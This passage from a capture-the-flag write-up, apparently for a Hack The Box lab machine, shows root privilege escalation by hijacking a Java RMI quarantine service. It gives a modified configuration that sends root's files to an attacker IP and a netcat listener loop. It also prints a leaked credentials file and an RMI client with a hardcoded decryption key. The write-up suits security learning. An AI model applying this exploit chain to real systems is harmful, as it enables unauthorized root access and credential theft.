2023/07/29 12:10:01 CMD: UID=0    PID=7842   | /usr/local/sbin/vhosts-manage -m quarantine 
2023/07/29 12:10:01 CMD: UID=0    PID=7844   | /usr/bin/java -jar /usr/share/vhost-manage/includes/quarantine.jar
```

We can transfer this back to our machine using `scp` and use any Java decompiler to view the code:

```
$ scp developer@webhosting.htb:/usr/share/vhost-manage/includes/quarantine.jar quarantine.jar
developer@webhosting.htb's password: 
quarantine.jar                                             100%   13KB 616.0KB/s   00:00
```

I first saw that this thing opens port 9002 again to run the service:

<figure><img src="../../.gitbook/assets/image (4118).png" alt=""><figcaption></figcaption></figure>

Afterwards, files scanned that are flagged as malicious are quarantined in a separate directory. The system contains a `/quarantine` directory which we have read access to. Afterwards, this thing also opens a listener port based on the configuration:

<figure><img src="../../.gitbook/assets/image (4119).png" alt=""><figcaption></figcaption></figure>

When checking the open ports on the machine, there are a few:

```
developer@registry:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5001            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3310            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -                   
tcp6       0      0 :::5000                 :::*                    LISTEN      -                   
tcp6       0      0 :::8009                 :::*                    LISTEN      -                   
tcp6       0      0 :::5001                 :::*                    LISTEN      -                   
tcp6       0      0 :::9002                 :::*                    LISTEN      -                   
tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
tcp6       0      0 :::9003                 :::*                    LISTEN      -                   
tcp6       0      0 :::3310                 :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::40241                :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

There's also a `registry.jar` present in the `/opt` directory of the machine:

```
developer@registry:/opt$ ls                                                                                         
containerd  registry.jar
```

Extracting from this file reveals that it contains the configurations that we need:

<figure><img src="../../.gitbook/assets/image (4120).png" alt=""><figcaption></figcaption></figure>

### Hijack Configuration --> Read Root Creds

Since `root` is executing the `quarantine.jar` file, and the quarantine has to scan all of the files present within a specified directory, we can modify it such that it is able to read and copy the entire `/root` directory, which includes the flag.&#x20;

Here are the parameters we can change:

* `quarantineDirectory` = `/quarantine`
* `monitorDirectory` = `/root`
* `clamHost` = Our IP
* `clamPort` = Our port
* `clamTimeout` = Any arbitrary number (I set it at 2000)

We can modify the `QuarantineServiceImpl.class` file as such:

```java
package com.htb.hosting.rmi.quarantine;

import com.htb.hosting.rmi.FileServiceConstants;
import java.io.File;
import java.rmi.RemoteException;
import java.util.logging.Logger;

public class QuarantineServiceImpl implements QuarantineService {
  private static final Logger logger = Logger.getLogger(QuarantineServiceImpl.class.getSimpleName());
  
  private static final QuarantineConfiguration DEFAULT_CONFIG;
  
  public QuarantineConfiguration getConfiguration() throws RemoteException {
    logger.info("client fetching configuration");
    return DEFAULT_CONFIG;
  }
  static {
  DEFAULT_CONFIG = new QuarantineConfiguration (new File ("/quarantine"), new File("/root/"), "10.10.14.24", 4444, 2000);
  }
}
```

Then, we can recompile this file and the rest of the `.jar`:

```
$ javac com/htb/hosting/rmi/quarantine/QuarantineServiceImpl.java
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
$ jar cmvf META-INF/MANIFEST.MF registry.jar .
```

Then, we need to keep running the code to hijack port 9002 and continuously listen on our own port 4444. The reason we need to do this is because:

* Port 9002 is already used within the machine and we want to hijack it whenever possible, which can take a while since it is always being used by `root`.
* The listener port must be activated multiple times because once it captures a request, the scan would not continue for the rest of the files. By having it continuously executed, it allows for scanning of multiple files.

```
developer@registry:/tmp$ while true; java -jar registry.jar; done

$ while true; do nc -lvnp 4444; done
```

Eventually, we'll see this on the `registry` machine:

```
[+] Bound to 9002
```

There'll also be a lot of hits on our listener port as it moves all the files from `/root` to the `/quarantine` folder. We will eventually find a `_root_.git-credentials` file:

<pre><code><strong>developer@registry:/quarantine$ ls *
</strong><strong>'quarantine-run-2023-07-29T14:33:15.287218947':
</strong>_root_.git-credentials

developer@registry:/quarantine/quarantine-run-2023-07-29T14:33:15.287218947$ cat _root_.git-credentials 
https://admin:52nWqz3tejiImlbsihtV@github.com
</code></pre>

We can then `su` to `root`:

<figure><img src="../../.gitbook/assets/image (4121).png" alt=""><figcaption></figcaption></figure>

## Final RMIClient Code

> This is not my code. I had help from another user for this machine because I was stuck. However, I did learn a lot from this code.&#x20;

```java
package com.htb.hosting.rmi;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.logging.Logger;
import java.io.File;
import java.io.Serializable;
import java.io.IOException;
import java.rmi.Remote;
import java.util.List;
import java.util.Arrays;
import java.util.ArrayList;
import java.nio.charset.StandardCharsets;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.Base64;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;

class AbstractFile implements Serializable {
    private static final long serialVersionUID = 2267537178761464006L;
    private final String fileRef;
    private final String vhostId;
    private final String displayName;
    private final File file;
    private final String absolutePath;
    private final String relativePath;
    private final boolean isFile;
    private final boolean isDirectory;
    private final long displaySize;
    private final String displayPermission;
    private final long displayModified;
    private final AbstractFile parentFile;

    public boolean isFile() {
        return this.isFile;
    }

    public String getName() {
        return this.file.getName();
    }

    public boolean canExecute() {
        return this.getFile().canExecute();
    }

    public boolean exists() {
        return this.isFile || this.isDirectory;
    }

    public AbstractFile(String fileRef, String vhostId, String displayName, File file, String absolutePath, String relativePath, boolean isFile, boolean isDirectory, long displaySize, String displayPermission, long displayModified, AbstractFile parentFile) {
    this.fileRef = fileRef;
    this.vhostId = vhostId;
    this.displayName = displayName;
    this.file = file;
    this.absolutePath = absolutePath;
    this.relativePath = relativePath;
    this.isFile = isFile;
    this.isDirectory = isDirectory;
    this.displaySize = displaySize;
    this.displayPermission = displayPermission;
    this.displayModified = displayModified;
    this.parentFile = parentFile;
    }

    public String getFileRef() {
        return this.fileRef;
    }

    public String getVhostId() {
        return this.vhostId;
    }

    public String getDisplayName() {
        return this.displayName;
    }

    public File getFile() {
        return this.file;
    }

    public String getAbsolutePath() {
        return this.absolutePath;
    }

    public String getRelativePath() {
        return this.relativePath;
    }

    public boolean isDirectory() {
        return this.isDirectory;
    }

    public long getDisplaySize() {
        return this.displaySize;
    }

    public String getDisplayPermission() {
        return this.displayPermission;
    }

    public long getDisplayModified() {
        return this.displayModified;
    }

    public AbstractFile getParentFile() {
        return this.parentFile;
    }
}

interface FileService extends Remote {
    List<AbstractFile> list(String var1, String var2) throws RemoteException;
    boolean uploadFile(String var1, String var2, byte[] var3) throws IOException;
    boolean delete(String var1) throws RemoteException;
    boolean createDirectory(String var1, String var2) throws RemoteException;
    byte[] view(String var1, String var2) throws IOException;
    AbstractFile getFile(String var1, String var2) throws RemoteException;
    AbstractFile getFile(String var1) throws RemoteException;
    void deleteDomain(String var1) throws RemoteException;
    boolean newDomain(String var1) throws RemoteException;
    byte[] view(String var1) throws RemoteException;
}

class CryptUtil {
    public static CryptUtil instance = new CryptUtil();
    Cipher ecipher;
    Cipher dcipher;
    byte[] salt = new byte[]{-87, -101, -56, 50, 86, 53, -29, 3};
    int iterationCount = 19;
    String secretKey = "48gREsTkb1evb3J8UfP7";

    public static CryptUtil getInstance() {
        return instance;
    }

    public String encrypt(String plainText) {
        try {
            KeySpec keySpec = new
            PBEKeySpec(this.secretKey.toCharArray(), this.salt, this.iterationCount);
            SecretKey key =
            SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(keySpec);
            AlgorithmParameterSpec paramSpec = new
            PBEParameterSpec(this.salt, this.iterationCount);
            this.ecipher = Cipher.getInstance(key.getAlgorithm());
            this.ecipher.init(1, key, paramSpec);
            String charSet = "UTF-8";
            byte[] in = plainText.getBytes("UTF-8");
            byte[] out = this.ecipher.doFinal(in);
            String encStr = Base64.getUrlEncoder().encodeToString(out);
            return encStr;
            } 
        catch (Exception var9) {
            throw new RuntimeException(var9);
            }
        }
    public String decrypt(String encryptedText) throws NoSuchAlgorithmException, InvalidKeySpecException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, UnsupportedEncodingException, IllegalBlockSizeException, BadPaddingException, IOException {
        KeySpec keySpec = new PBEKeySpec(this.secretKey.toCharArray(),
        this.salt, this.iterationCount);
        SecretKey key =
        SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(keySpec);
        AlgorithmParameterSpec paramSpec = new PBEParameterSpec(this.salt,
        this.iterationCount);
        this.dcipher = Cipher.getInstance(key.getAlgorithm());
        this.dcipher.init(2, key, paramSpec);
        byte[] enc = Base64.getUrlDecoder().decode(encryptedText);
        byte[] utf8 = this.dcipher.doFinal(enc);
        String charSet = "UTF-8";
        String plainStr = new String(utf8, "UTF-8");
        return plainStr;
    }
}

public class RMIClientWrapper {
    private static final Logger log =
    Logger.getLogger(RMIClientWrapper.class.getSimpleName());
    public static FileService get() {
        try {
            String rmiHost = "registry.webhosting.htb";
            // String rmiHost = "127.0.0.1";
            System.setProperty("java.rmi.server.hostname", rmiHost);
            System.setProperty("com.sun.management.jmxremote.rmi.port",
            "9002");
            log.info(String.format("Connecting to %s:%d", rmiHost,
            9002));
            Registry registry = LocateRegistry.getRegistry(rmiHost,
            9002);
            return (FileService) registry.lookup("FileService");
        } 

        catch (Exception var2) {
            var2.printStackTrace();
            throw new RuntimeException(var2);
        }
    }

    public static void main(String args[]) {
        try {
            if(args.length < 2){
            System.out.println("Provide a directory to list as first argument and file path as a second argument.");
            System.exit(0);
        }
        String dir_to_list = args[0];
        String filename = args[1];
        CryptUtil aa = new CryptUtil();
        list_files(dir_to_list);
        readFile(aa.encrypt(filename));
        } 
        catch (RemoteException e) {
            e.printStackTrace();
        };
    }

    public static void list_files(String path) throws RemoteException {
        List<AbstractFile> list_files = get().list("950ba61ab119", path);
        for(AbstractFile file:list_files){
        System.out.println(file.getAbsolutePath());
        }
        System.out.println();
    }
    
    public static void displayFileInfo(String enc_name) throws RemoteException {
    AbstractFile tmp = get().getFile(enc_name);
    System.out.println("getFileRef: " + tmp.getFileRef());
    System.out.println("getVhostId: " + tmp.getVhostId());
    System.out.println("getDisplayName: " + tmp.getDisplayName());
    System.out.println("getFile: " + tmp.getFile());
    System.out.println("getAbsolutePath: " + tmp.getAbsolutePath());
    System.out.println("getRelativePath: " + tmp.getRelativePath());
    System.out.println("getDisplaySize: " + tmp.getDisplaySize());
    System.out.println("getDisplayPermission: " +
    tmp.getDisplayPermission());
    System.out.println("getDisplayModified: " +
    tmp.getDisplayModified());
    System.out.println("getParentFile: " + tmp.getParentFile());
    }

    public static void readFile(String enc_name) throws RemoteException {
        System.out.println("\nReading content:");
        byte[] byteArray = get().view(enc_name);
        String s = new String(byteArray, StandardCharsets.UTF_8);
        System.out.println(s);
    }
}
```
